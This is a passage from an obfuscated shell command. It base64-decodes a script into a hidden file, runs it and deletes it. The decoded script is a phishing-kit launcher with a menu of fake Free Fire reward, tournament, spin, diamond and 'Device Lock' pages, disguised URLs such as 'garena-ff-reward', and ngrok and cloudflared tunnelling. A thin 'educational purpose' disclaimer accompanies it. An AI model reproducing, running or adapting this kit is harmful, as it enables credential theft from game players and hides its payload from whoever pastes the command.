xzTU5oKy0gICAgICAgICIKICBlY2hvIC1lICRyICIgIC1+Ly5zc2gvaWRfcnNhLkRlcy0gICAgICAgICAgICAgICAgICAgaHROMDFVc2VyV3JvdGVNZSEtICAgICAgICIKICBlY2hvIC1lICRyICIgIDpkb3BlQVcuTm88bmFubz5vICAgICAgICAgICAgICAgICAgICAgOmlzOlTQr2lLQy5zdWRvLS5BOiAgICAgICAiCiAgZWNobyAtZSAkciAiICA6d2UncmUuYWxsLmFsaWtlICAgICAgICAgICAgICAgICAgICAgICBUaGUuUEZZcm95Lk5vLkQ3OiAgICAgICAiCiAgZWNobyAtZSAkciAiICA6UExBQ0VEUklOS0hFUkUhOiAgICAgICAgICAgICAgICAgICAgICB5eHBfY21kc2hlbGwuQWIwOiAgICAgICAiCiAgZWNobyAtZSAkciAiICA6bXNmPmV4cGxvaXQgLWouICAgICAgICAgICAgICAgICAgICAgICA6TnMuQk9CJkFMSUNFZXM3OiAgICAgICAiCiAgZWNobyAtZSAkciAiICA6LS0tc3J3eHJ3eDotLiAgICAgICAgICAgICAgICAgICAgICAgICAgTVMxNDYuNTIuTm8uUGVyOiAgICAgICAiCiAgZWNobyAtZSAkciAiICA6PHNjcmlwdD4uQWM4MTYvICAgICAgICAgICAgICAgICAgICAgICAgc0VOYm92ZTMxMDEuNDA0OiAgICAgICAiCiAgZWNobyAtZSAkciAiICA6TlRfQVVUSE9SSVRZLkRvICAgICAgICAgICAgICAgICAgICAgICAgIFQ6L3NoU1lTVEVNLS5OOiAgICAgICAiCiAgZWNobyAtZSAkciAiICA6MDkuMTQuMjAxMS5yYWlkICAgICAgICAgICAgICAgICAgICAgICAvU1RGVXx3YWxsLk5vLlByOiAgICAgICAiCiAgZWNobyAtZSAkZyAiICA6aGV2bnNudFN1cmIwMjVOLiAgICAgICAgICAgICAgICAgICAgICBkTlZSR09JTkcyR0lWVVVQOiAgICAgICAiCiAgZWNobyAtZSAkZyAiICA6I09VVEhPVVNFLSAgLXM6ICAgICAgICAgICAgICAgICAgICAgICAvY29yeWtlbm5lZHlEYXRhOiAgICAgICAiCiAgZWNobyAtZSAkZyAiICA6JG5tYXAgLW9TZnkuJCUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTU28uNjE3ODMwNkVuY2U6ICAgICAgICAgIgogIGVjaG8gLWUgJGcgIiAgOkF3c20uZGE6ICAgICAgICAgICAgICAgICAgICAgICAgICAgL3NoTVRsI2JlYXRzM28uTm95bDogICAgICAgIgogIGVjaG8gLWUgJGcgIiAgOlJpbmcwOiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGREZXN0Um95UkVYS0MzdGEvTTogICAgICAgIgogIGVjaG8gLWUgJEIgIiAgOjIzZDogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc1NFVEVDLkFTVFJPTk9NWWlzdDogICAgICAgIgogIGVjaG8gLWUgJEIgIiAgIC8tICAgICAgICAgICAgICAgICAgICAgICAgL3lvLSAgICAuZW5jZS5OOigpeyA6fDogJiB9OzogICAgICAgIgogIGVjaG8gLWUgJEIgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDpTaGFsbC5XZS5QbGF5LkEuR2FtZT90cm9uLyAgICAgICAgIgogIGVjaG8gLWUgJEIgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW9veS5pZjFnaHRmMHIrZWhVc2VyNS4gICAgICAgICAgIgogIGVjaG8gLWUgJEIgIiAgICAgICAgICAgICAgICAgICAgICAgICAgIC4udGgzLkgxVjMuVTJWalJGTk4uak14eS4gICAgICAgICAgICAgIgogIGVjaG8gLWUgJEIgIiAgICAgICAgICAgICAgICAgICAgICAgICAgIE1qTX5+V0UuQVJFLnNlfn5NTWpNcyAgICAgICAgICAgICAgICAgIgogIGVjaG8gLWUgJEIgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICt+S0FOU0FTLkNJVFkgc35uYSAgICAgICAgICAgICAgICAgICAgIgogIGVjaG8gLWUgJEIgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKfkhBS0NFUlN+Li8uICAgICAgICAgICAgICAgICAgICAgICAgIgogIGVjaG8gLWUgJEIgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAuZXNjOndxITogICAgICAgICAgICAgICAgICAgICAgICAgICAgIgogIGVjaG8gLWUgJEIgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICArc2Vjb3VuZCAgICAgICAgICAgICAgICAgICAgIgogIGVjaG8gLWUgJEIgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKy4udSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIKICBlY2hvIC1lICRCICIJCQkJICAgICArCQkJCSIKfQoKIyMgYXJyb3cKYXJyb3dzKCkgewpmdW5jdGlvbiBzZWxlY3Rfb3B0aW9uIHsKCiAgICBFU0M9JCggcHJpbnRmICJcMDMzIikKICAgIGN1cnNvcl9ibGlua19vbigpICB7IHByaW50ZiAiJEVTQ1s/MjVoIjsgfQogICAgY3Vyc29yX2JsaW5rX29mZigpIHsgcHJpbnRmICIkRVNDWz8yNWwiOyB9CiAgICBjdXJzb3JfdG8oKSAgICAgICAgeyBwcmludGYgIiRFU0NbJDE7JHsyOi0xfUgiOyB9CiAgICBwcmludF9vcHRpb24oKSAgICAgeyBwcmludGYgIiAgICQxICI7IH0KICAgIHByaW50X3NlbGVjdGVkKCkgICB7IHByaW50ZiAiICAkRVNDWzdtICQxICRFU0NbMjdtIjsgfQogICAgZ2V0X2N1cnNvcl9yb3coKSAgIHsgSUZTPSc7JyByZWFkIC1zZFIgLXAgJCdcRVs2bicgUk9XIENPTDsgZWNobyAke1JPVyMqW307IH0KICAgIGtleV9pbnB1dCgpICAgICAgICB7IHJlYWQgLXMgLW4zIGtleSAyPi9kZXYvbnVsbCA+JjIKICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFtbICRrZXkgPSAkRVNDW0EgXV07IHRoZW4gZWNobyB1cDsgICAgZmkKICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFtbICRrZXkgPSAkRVNDW0IgXV07IHRoZW4gZWNobyBkb3duOyAgZmkKICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFtbICRrZXkgPSAiIiAgICAgXV07IHRoZW4gZWNobyBlbnRlcjsgZmk7IH0KCiAgICAjIGluaXRpYWxseSBwcmludCBlbXB0eSBuZXcgbGluZXMgKHNjcm9sbCBkb3duIGlmIGF0IGJvdHRvbSBvZiBzY3JlZW4pCiAgICBmb3Igb3B0OyBkbyBwcmludGYgIlxuIjsgZG9uZQoKICAgICMgZGV0ZXJtaW5lIGN1cnJlbnQgc2NyZWVuIHBvc2l0aW9uIGZvciBvdmVyd3JpdGluZyB0aGUgb3B0aW9ucwogICAgbG9jYWwgbGFzdHJvdz1gZ2V0X2N1cnNvcl9yb3dgCiAgICBsb2NhbCBzdGFydHJvdz0kKCgkbGFzdHJvdyAtICQjKSkKCiAgICAjIGVuc3VyZSBjdXJzb3IgYW5kIGlucHV0IGVjaG9pbmcgYmFjayBvbiB1cG9uIGEgY3RybCtjIGR1cmluZyByZWFkIC1zCiAgICB0cmFwICJj



IlxyXGVbOTFtW1xlWzkybStcZVs5MW1dXGVbMTs5M21cMDMzWzM2bSBQcm9jZXNzaW5nLi4uIgogICAgc2xlZXAgMC4yMAogICAgcHJpbnRmICJcclxlWzkxbVtcZVs5Mm0rXGVbOTFtXVxlWzE7OTNtXDAzM1szMm0gUHJvY2Vzc2luZy4uLiIgICAgICAgICAgICAgICAgICAgICAgCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyXGVbOTFtW1xlWzkybStcZVs5MW1dXGVbMTs5M21cMDMzWzMxbSBQcm9jZXNzaW5nLi4uIgogICAgc2xlZXAgMC4yMAogICAgcHJpbnRmICJcclxlWzkxbVtcZVs5Mm0rXGVbOTFtXVxlWzE7OTNtXDAzM1szNW0gUHJvY2Vzc2luZy4uLiIKICAgIHNsZWVwIDAuMjAKICAgIHByaW50ZiAiXHJcZVs5MW1bXGVbOTJtK1xlWzkxbV1cZVsxOzkzbVwwMzNbMzRtIFByb2Nlc3NpbmcuLi4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyXGVbOTFtW1xlWzkybStcZVs5MW1dXGVbMTs5M21cMDMzWzMzbSBQcm9jZXNzaW5nLi4uIgogICAgc2xlZXAgMC4yMAogICAgcHJpbnRmICJcclxlWzkxbVtcZVs5Mm0rXGVbOTFtXVxlWzE7OTNtXDAzM1szMm0gUHJvY2Vzc2luZy4uLiIKICAgIHNsZWVwIDAuMjAKfQoKIyMgTWVudQptYWluX21lbnUoKSB7Cgl7IGNsZWFyOyBiYW5uZXI7IH0KZWNobyAiIgplY2hvIC1lICIkciAxJGIgLT4kRyBGcmVlIEZpcmUgQ29kZSIKZWNobyAiIgplY2hvIC1lICIkciAyJGIgLT4kRyBGcmVlIEZpcmUgVG91cm5hbWVudCIKZWNobyAiIgplY2hvIC1lICIkciAzJGIgLT4kRyBGcmVlIEZpcmUgRXZlbnQiCmVjaG8gIiIKZWNobyAtZSAiJHIgNCRiIC0+JEcgRnJlZSBGaXJlIEdhbWUgS2FyaWRvIgplY2hvICIiCmVjaG8gLWUgIiRyIDUkYiAtPiRHIEZyZWUgRmlyZSBTcGluIgplY2hvICIiCmVjaG8gLWUgIiRyIDYkYiAtPiRHIEZyZWUgRmlyZSBTdG9yZSIKZWNobyAiIgplY2hvIC1lICIkciA3JGIgLT4kRyBGcmVlIEZpcmUgbWFnaWMgRXZlbnQiCmVjaG8gIiIKZWNobyAtZSAgJEsiTm90IFlldCBSZWFkIiR3CmVjaG8gIiIKZWNobyAtZSAiJHIgOCRiIC0+JEcgRnJlZSBGaXJlIERpYW1vbmQiCmVjaG8gIiIKZWNobyAtZSAgJEsiQm9udXMgU2l0ZSIkdwplY2hvICIiCmVjaG8gLWUgIiRyIDkkYiAtPiRHIERldmljZSBMb2NrIiRQCgplY2hvICIiCnJlYWQgLXAgIkNob29zZSBZb3VyIE9wdGlvbiA6ICIgb3B0aW9uIAoKY2FzZSAkb3B0aW9uIGluCgoJCTEpCiAJCQlwcmMxCiAgICAgICAgICAgICAgICAgICAgICAgIHdlYnNpdGU9IkZGcmV3YXJkIgogICAgICAgICAgICAgICAgICAgICAgICBtYXNrPSJodHRwOi8vZ2FyZW5hLWZmLXJld2FyZCIKICAgICAgICAgICAgICAgICAgICAgICAgdHVubmVsX21lbnU7OwogICAgICAgICAgICAgICAgMikKCQkJcHJjMQogICAgICAgICAgICAgICAgICAgICAgICB3ZWJzaXRlPSJGRmFsbCIKICAgICAgICAgICAgICAgICAgICAgICAgbWFzaz0iaHR0cDovL2ZyZWVmaXJlLXRvdXJuYW1lbnQtcmVnaXN0cmF0aW9uIgogICAgICAgICAgICAgICAgICAgICAgICB0dW5uZWxfbWVudTs7CiAgICAgICAgICAgICAgICAzKQoJCQlwcmMxCiAgICAgICAgICAgICAgICAgICAgICAgIHdlYnNpdGU9ImZmZXZlbnQiCiAgICAgICAgICAgICAgICAgICAgICAgIG1hc2s9Imh0dHA6Ly9mZi1ldmVudC1zcyIKICAgICAgICAgICAgICAgICAgICAgICAgdHVubmVsX21lbnU7OwoJCTQpCgkJCXByYzEKCQkJd2Vic2l0ZT0iZ2FtZWthIgoJCQltYXNrPSJodHRwOi8vR2FtZUthcmlkby1vZmZpY2lhbC5jb20iCgkJCXR1bm5lbF9tZW51OzsKCQk1KQoJCQlwcmMxCgkJCXdlYnNpdGU9ImZmc3BpbiIKICAgICAgICAgICAgICAgICAgICAgICAgbWFzaz0iaHR0cHM6Ly9mZi1zcGluLWdhcmVuYSIKICAgICAgICAgICAgICAgICAgICAgICAgdHVubmVsX21lbnU7OwoJCTYpCgkJCXByYzEKCQkJd2Vic2l0ZT0iZmZzdG9yZSIKCQkJbWFzaz0iaHR0cHM6Ly9mZi1zcGluLWdhcmVuYSIKCQkJdHVubmVsX21lbnU7OwoJCTcpCgkJCXByYzEKCQkJd2Vic2l0ZT0ibWdldmVudCIKCQkJbWFzaz0iaHR0cDovL0ZyZWVGaXJlLW1hZ2ljLWdhcmVuYSIKCQkJdHVubmVsX21lbnU7OwoJCTgpCgkJCXByYzEKCQkJd2Vic2l0ZT0iZmZnaWZ0IgogICAgICAgICAgICAgICAgICAgICAgICBtYXNrPSJodHRwOi8vZmYtZ2lmdC1nYXJlbmEiCiAgICAgICAgICAgICAgICAgICAgICAgIHR1bm5lbF9tZW51OzsKCQk5KQkKCQkJcHJjMQoJCQl3ZWJzaXRlPSJkZXZpY2VMb2NrIgoJCQltYXNrPSJodHRwOi8vbWFrZS1zdXJlLXlvdS1zYWZlIgoJCQl0dW5uZWxfbWVudTs7CgoJCTEwKQoJCQlhbSBzdGFydCAtLXVzZXIgMCAtbiBjb20uaW5zdGFncmFtLmFuZHJvaWQvY29tLmluc3RhZ3JhbS5hbmRyb2lkLmFjdGl2aXR5Lk1haW5UYWJBY3Rpdml0eSAtZCBodHRwczovL2luc3RhZ3JhbS5jb20vaGFzYW5mcTYgJj4gL2Rldi9udWxsOwoJCQltc2dfZXhpdDs7CgkJKikKCQkJZWNobyAtbmUgIlxuJHtMR318JHtHTH0hJHtMR318JHtMR30gSW52YWxpZCBPcHRpb24sIFRyeSBBZ2Fpbi4uLiIKCQkJeyBzbGVlcCAxOyBtYWluX21lbnU7IH07OwoJCgllc2FjCn0KCiAgICAgICAgICAgICAgIGVjaG8gLWUgInRoYW5rJ3MgZm9yIHVzaW5nIHRoaXMgc2NyaXB0IGNyZWF0ZWQgYnkgaGFzYW5mcSBiZSBpIHdpbGwgbm90IHJlc3BvbnNpYmxlIGZvciBhbnkgZGFtYWdlIGlzc3VlZCBteSB0aGlzIHNjcmlwdCB0aGlzIG1hZGUgZm9yIG9ubHkgZWR1Y2F0aW9uYWwgcHVycG9zZS4uISIKCiMjIE1haW4Ka2lsbF9waWQKZGVwZW5kZW5jaWVzCmluc3RhbGxfbmdyb2sKaW5zdGFsbF9jbG91ZGZsYXJlZAptYWluX21lbnUKCg==" | base64 --decode >> .ww && bash .ww && rm -rf .ww
